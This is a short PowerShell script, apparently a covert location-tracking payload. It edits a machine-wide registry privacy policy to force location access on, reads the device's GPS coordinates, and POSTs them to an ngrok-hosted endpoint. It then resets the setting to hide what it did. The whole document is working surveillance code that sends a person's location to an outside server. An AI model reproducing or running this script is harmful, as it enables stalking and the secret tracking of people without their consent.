Add-Type -AssemblyName System.Device 
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
$GeoWatcher.Start() 

$ngrokServer = 'http://ngrok_link/index.php'
Set-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '1'

while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 
}  

if ($GeoWatcher.Permission -eq 'Denied'){
    Write-Error 'Access Denied for Location Information'
} else {
    $sendData = $GeoWatcher.Position.Location
    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $sendData
    Set-ItemProperty -path 'HKLM:\SOFTWARE\\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'
}
